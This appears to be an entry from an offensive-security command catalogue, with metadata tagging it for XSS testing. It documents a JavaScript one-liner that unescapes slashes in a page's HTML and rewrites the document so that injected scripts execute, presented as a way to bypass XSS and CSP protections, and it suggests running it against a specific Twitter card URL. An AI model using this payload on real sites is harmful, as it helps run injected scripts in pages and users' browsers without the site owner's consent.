---
data: 'document.write(document.body.innerHTML.replace(/\\\\//g,''/''));'
tags:
  - xss
  - testing
type: command
executor: javascript
platforms:
  - Web
id: e09c0d27-c795-4c98-aa0b-fcef7e3e2948
created_at: '2025-12-13T23:56:20.410Z'
updated_at: '2025-12-13T23:56:20.410Z'
verified: false
validated: true
submitted: true
---
# unescape-and-rewrite-document

## Command

```javascript
document.write(document.body.innerHTML.replace(/\\\\//g,'/'));
```

## Description

This JavaScript command replaces escaped slashes in the page's innerHTML and rewrites the document to unescape and render injected content, used for testing XSS and CSP bypasses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/\\\\//g` | Global regex for double-escaped slashes | Yes |
| `'/'` | Replacement with single slash | Yes |

## Examples

### Basic Usage

```javascript
document.write(document.body.innerHTML.replace(/\\\\//g,'/'));
```

### Advanced Usage

Run in browser console on a specific URL like https://twitter.com/i/cards/tfw/v1/1114986988128624640.

## Expected Output

Renders the page with unescaped content, executing injected scripts such as alerts if successful.

## Related

- [[procedures/Trigger-XSS-via-Twitter-Card]]
- [[tools/Browser-Console]]
